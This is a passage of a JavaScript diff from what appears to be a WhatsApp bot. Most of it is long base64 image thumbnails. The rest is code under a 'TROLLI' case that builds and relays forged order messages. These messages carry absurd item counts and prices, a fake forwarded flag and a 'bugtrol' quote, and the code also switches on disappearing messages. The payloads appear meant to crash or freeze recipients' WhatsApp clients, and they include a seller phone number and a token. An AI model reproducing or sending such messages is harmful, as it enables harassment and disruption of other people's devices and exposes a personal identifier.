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",
+"itemCount": 1000000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"orderTitle": "GUA GK NGERTI",
+"message":"entah lah gua nob",
+"sellerJid": "6288224859350@s.whatsapp.net",
+"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
+"totalAmount1000": "99999999999999999999",
+"totalCurrencyCode": "IDR",
+"contextInfo": {
+"forwardingScore": 3,
+"isForwarded": true
+}
+}
+}, {quoted:bugtrol, contextInfo:{}}) 
+
+dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
+dha.relayWAMessage(res)
+break  
+case 'p': // TROLLI
+buf = Mfake
+imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeg = imeu.message.imageMessage
+res = await dha.prepareMessageFromContent(from,{
+"orderMessage": {
+"orderId": "150453297177375",
+"thumbnail": "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